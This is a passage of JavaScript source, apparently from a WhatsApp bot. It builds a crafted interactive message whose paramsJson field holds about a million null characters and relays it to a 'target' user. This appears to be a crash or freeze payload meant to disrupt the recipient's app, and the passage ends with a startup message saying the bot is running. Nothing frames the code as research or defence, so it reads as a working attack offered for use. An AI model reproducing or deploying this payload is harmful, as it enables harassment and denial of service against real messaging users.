                    quotedMessage: {
                        interactiveResponseMessage: {
                            nativeFlowResponseMessage: {
                                version: 3,
                                name: "call_permission_request",
                                paramsJson: "\u0000".repeat(1045000)
                            },
                            body: {
                                text: "Ewe Bang Enak",
                                format: "DEFAULT"
                            }
                        }
                    }
                }
            }
        }
    });

    const msg = await generateWAMessageFromContent(target, Silent, { userJid: target });
    await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
}

// Error handling
process.on('uncaughtException', (error) => {
    console.error('Uncaught Exception:', error);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('Unhandled Rejection at:', promise, 'reason:', reason);
});

console.log('𝖡𝗈𝗍 𝖲𝗎𝖽𝖺𝗁 𝖡𝖾𝗋𝗃𝖺𝗅𝖺𝚗');
